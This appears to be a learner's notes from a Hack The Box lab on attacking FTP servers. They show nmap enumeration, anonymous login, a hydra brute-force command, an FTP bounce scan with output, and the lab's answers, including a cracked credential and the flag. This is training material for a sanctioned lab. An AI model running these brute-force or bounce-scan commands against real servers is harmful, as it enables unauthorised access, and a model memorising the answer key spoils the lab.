# Attacking FTP
## Enumeration
Nmap default scripts `-sC` includes the `ftp-anon` Nmap script which checks if a FTP server allows anonymous logins.

```sh
masterofblafu@htb[/htb]$ sudo nmap -sC -sV -p 21 192.168.2.142 
```

## Anonymous Authentication
```sh
masterofblafu@htb[/htb]$ ftp 192.168.2.142    
                     
Connected to 192.168.2.142.
220 (vsFTPd 2.3.4)
Name (192.168.2.142:kali): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0               9 Aug 12 16:51 test.txt
226 Directory send OK.
```

Once we get access to an FTP server with anonymous credentials, we can start searching for interesting information. We can use the commands `ls` and `cd` to move around directories like in Linux. To download a single file, we use `get`, and to download multiple files, we can use `mget`. For upload operations, we can use `put` for a simple file or `mput` for multiple files. We can use help in the FTP client session for more information.

## Protocol Specifics Attacks
### Brute Force
```sh
masterofblafu@htb[/htb]$ hydra -L usernames.txt -P passwords.txt -s 2121 ftp://10.129.25.246
```

### FTP Bounce Attack
```sh
masterofblafu@htb[/htb]$ nmap -Pn -v -n -p80 -b anonymous:password@10.10.110.213 172.17.0.2

Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-27 04:55 EDT
Resolved FTP bounce attack proxy to 10.10.110.213 (10.10.110.213).
Attempting connection to ftp://anonymous:password@10.10.110.213:21
Connected:220 (vsFTPd 3.0.3)
Login credentials accepted by FTP server!
Initiating Bounce Scan at 04:55
FTP command misalignment detected ... correcting.
Completed Bounce Scan at 04:55, 0.54s elapsed (1 total ports)
Nmap scan report for 172.17.0.2
Host is up.

PORT   STATE  SERVICE
80/tcp open http

<SNIP>
```

## Questions
1. What port is the FTP service running on? **Answer: 2121**
   - `$ nmap -sV 10.129.25.246`
2. What username is available for the FTP server? **Answer: robin**
   - `$ ftp 10.129.25.246 2121` → Login as anonymous and download the `users.list` and `pws.list`
   - `$ hydra -L users.list -P pws.list -s 2121 ftp://10.129.25.246` → Bruteforce and retrieve a valid credentials `robin:7iz4rnckjsduza7` 
3. Using the credentials obtained earlier, retrieve the flag.txt file. Submit the contents as your answer. **Answer: HTB{ATT4CK1NG_F7P_53RV1C3}**
   - `$ ftp robin@10.129.25.246 2121` → Login as robin with the retrieved password
   - `ftp> more flag.txt` → Read the flag